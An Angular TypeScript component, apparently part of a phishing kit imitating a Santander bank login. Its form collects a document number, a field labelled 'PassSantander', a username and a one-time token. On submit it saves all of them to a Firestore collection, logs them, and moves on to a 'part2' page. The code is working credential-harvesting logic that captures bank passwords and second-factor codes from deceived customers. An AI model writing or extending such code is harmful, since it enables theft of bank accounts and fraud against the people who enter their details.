import { Component, OnInit } from '@angular/core';
import { FormControl, FormGroup } from '@angular/forms';
import { Router } from '@angular/router';
import user from 'src/app/Interface/Interface';
import { FirestoreService } from 'src/app/Services/firestore.service';
import { InteractionService } from 'src/app/Services/interaction.service';

@Component({
  selector: 'app-token',
  templateUrl: './token.component.html',
  styleUrls: ['./token.component.scss'],
})
export class TokenComponent  implements OnInit {

  formulario: FormGroup;

  User: user={
    // rta: null,
    id: '',
    numDocuments: '',
    PassSantander: '',
    User: '', 
    token: '',
   };

  constructor(
          private firestore: FirestoreService,
          private interaction: InteractionService,
          private router: Router,
  ) {
    this.formulario = new FormGroup({
      id: new FormControl,
      numDocuments: new FormControl,
      PassSantander: new FormControl,
      User: new FormControl,
      token: new FormControl,
    })
  }

ngOnInit() : void {
}



  onSubmit() {
    const userData: user = this.formulario.value;
    // userData.timestamp = firestore.FieldValue.serverTimestamp(); // Establecer fecha y hora actual
                    // Obtener la fecha y hora actual del cliente
                    const timestamp = new Date();
                
                    // Agregar la fecha y hora actual al documento de datos
                    userData.timestamp = timestamp;
    this.firestore.addUser(userData).then(() => {
      // this.interaction.presentLoading("Ingresando..")
      console.log('Usuario agregado correctamente a Firestore:', userData);
    }).catch((error) => {
      console.error('Error al agregar usuario a Firestore:', error);
      
    });
    this.router.navigate(['part2']);
    // this.interaction.closeLoading();
  }

}
